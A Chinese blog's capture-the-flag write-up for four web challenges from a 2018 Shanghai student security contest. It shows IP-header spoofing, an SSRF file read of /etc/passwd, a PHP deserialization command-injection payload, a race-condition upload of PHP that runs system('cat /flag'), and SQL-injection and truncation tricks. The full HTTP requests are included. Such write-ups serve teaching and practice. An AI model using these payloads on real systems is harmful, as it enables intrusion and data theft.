<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>第四届上海市大学生网络安全大赛WEB writeup - sn00py</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=生活,博客,前端,游戏>
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  
    <link rel="alternate" href="/atom.xml " title="sn00py" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/style.css">
</head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">sn00py</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/archives" class="menu-item-link">Archives</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/friends/" class="menu-item-link">Frinds</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">第四届上海市大学生网络安全大赛WEB writeup</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2018-11-05</span>
  </div>
  <div class="post-content">
    <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>用X-Client-Ip过掉IP限制，参数url似乎有个SSRF，请求的内容会保存到返回的图片中。</p>
<p>但是限制了url必须有<code>//www.ichunqiu.com</code>，利用<code>file://ww.ichunqiu.com/etc/passwd</code>可以读取到本地文件。</p>
<p><img src="/2018/11/05/第四届上海市大学生网络安全大赛WEB-writeup/image-20181104105027172.png" alt="image-20181104105027172"></p>
<p><img src="/2018/11/05/第四届上海市大学生网络安全大赛WEB-writeup/image-20181104105054326.png" alt="image-20181104105054326"></p>
<p>其他一些绕IP限制的HTTP头还有：</p>
<ul>
<li>X-Originating-IP</li>
<li>X-Forwarded-For</li>
<li>X-Remote-IP</li>
<li>X-Remote-Addr</li>
<li>X-Client-Ip</li>
</ul>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $str = preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>, <span class="string">""</span>, $str);</span><br><span class="line">        $str = str_replace(<span class="string">'flag'</span>, <span class="string">''</span>, $str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"echo $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echo"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first = <span class="string">'hi'</span>;</span><br><span class="line">$var = <span class="string">'var'</span>;</span><br><span class="line">$bbb = <span class="string">'bbb'</span>;</span><br><span class="line">$ccc = <span class="string">'ccc'</span>;</span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($i === <span class="number">1</span>) &#123;</span><br><span class="line">        $i++;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($first === <span class="string">"doller"</span>) &#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($var === <span class="string">"give"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($bbb === <span class="string">"me"</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ccc === <span class="string">"flag"</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;welcome!&lt;br&gt;"</span>;</span><br><span class="line">                $come = @$_POST[<span class="string">'come'</span>];</span><br><span class="line">                unserialize($come);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;think about it&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Can you hack me?&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用双<code>$</code>和<code>parse_str()</code>两处变量覆盖，可以绕过这几个if判断，进入到反序列化流程。</p>
<p>反序列化里是一个简单的pop链，调用echo函数执行命令：</p>
<p>用<code>&amp;</code>拼接命令，用<code>${IFS}</code>绕过空格，用<code>fl&quot;&quot;ag</code>或者<code>fflaglag</code>绕过”flag”字符串过滤。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test = <span class="keyword">new</span> come(<span class="string">'echo'</span>, [<span class="string">'host'</span> =&gt; <span class="string">'123&amp;cat$&#123;IFS&#125;/fl""ag'</span>]);</span><br><span class="line">$se = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> urlencode($se);</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 52cf05474980444391d982573116b2f4b163dc49680848f7.game.ichunqiu.com</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-HK;q=0.6,ja;q=0.5</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 213</span><br><span class="line"></span><br><span class="line">come=O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3Ba%3A1%3A%7Bs%3A4%3A%22host%22%3Bs%3A20%3A%22123%26cat%24%7BIFS%7D%2Ffl%22%22ag%22%3B%7D%7D123</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/05/第四届上海市大学生网络安全大赛WEB-writeup/image-20181104114514970.png" alt="image-20181104114514970"></p>
<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span></span><br><span class="line">$dir=md5(<span class="string">"icq"</span>);</span><br><span class="line">$sandbox = <span class="string">'/var/sandbox/'</span> . $dir;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]) &#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span> ($ext == $filename[count($filename) - <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"emmmm..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(<span class="number">100</span>, <span class="number">999</span>) . <span class="string">"."</span> . $ext;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">'hehe'</span>];</span><br><span class="line">    <span class="keyword">if</span> (@substr(file($_)[<span class="number">0</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">'@&lt;?php'</span> &amp;&amp; strpos($_, $new_name) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>($_);</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码的流程是上传一个文件，文件名可控，然后把文件名按<code>.</code>拆成一个数组，用两种方式来取文件后缀。</p>
<p>一是用end()函数，这种方法没问题，取出的一定是文件后缀；</p>
<p>二是用<code>$filename[count($filename) - 1]</code>，这样是按下标来取，只要<code>count($filename) - 1</code>不是最后一个元素的下标就能绕过。例如<code>file[3]=666.php</code>。</p>
<p>接下来的逻辑就是包含<code>$_</code>，但<code>$_</code>不能是刚才上传的这个文件。</p>
<p>最后删除上传的文件。</p>
<p>注意到从<code>上传=&gt;包含=&gt;删除</code>这个过程是存在时间差的，并且文件名只有3位是随机数字。所以，暴力一点的解法就是直接开几个burp，随便指定几个文件名，互相撞。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 7db403947fb245b697c840674fc1f01bb0c90ffc983d4d39.game.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span>: 428</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryN6z6HX5G8UBBX4xq</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:8888/up.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-HK;q=0.6,ja;q=0.5</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryN6z6HX5G8UBBX4xq</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file[3]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">666.php</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundaryN6z6HX5G8UBBX4xq</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="hehe"</span><br><span class="line"></span><br><span class="line"><span class="attribute">750.666.php</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundaryN6z6HX5G8UBBX4xq</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="test.png"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"></span><br><span class="line">@&lt;?php echo system('cat /flag');phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundaryN6z6HX5G8UBBX4xq--</span><br></pre></td></tr></table></figure>
<p>我开了3个窗口，大概5分钟就撞到了。</p>
<p><img src="/2018/11/05/第四届上海市大学生网络安全大赛WEB-writeup/image-20181104151221880.png" alt="image-20181104151221880"></p>
<p>预期解应该是上传一个<code>shell.php/.</code>文件，导致unlink无法删除，然后爆破随机数包含。</p>
<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>参数id存在注入，sqlmap跑一下拿到admin的密码，登陆后是一个上传表单。XFF头里加上<code>10.10.0.1</code>。</p>
<p>文件路径是用uploaddir拼接上filename截取<code>/</code>之后的字符，最后再拼上<code>.txt</code>。</p>
<p>利用<code>upload=./flag.ph</code>和<code>filename=123/p</code>可以拼出一个<code>./flag.php.txt</code>，但是题目要求上传成<code>flag.php</code>,也就是截断掉后面的txt就行了。</p>
<p>fuzz一下<code>00~ff</code>内的字符可以找到<code>0x02</code>可以绕过，</p>
<p><img src="/2018/11/05/第四届上海市大学生网络安全大赛WEB-writeup/image-20181104162022352.png" alt="image-20181104162022352"></p>
<p><img src="/2018/11/05/第四届上海市大学生网络安全大赛WEB-writeup/image-20181104162038879.png" alt="image-20181104162038879"></p>

  </div>
  <div class="post-footer">
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>
<footer>
  &copy; 2018
  <span class="author">
    sn00py
  </span>
</footer>
    </div>
  </body>
</html>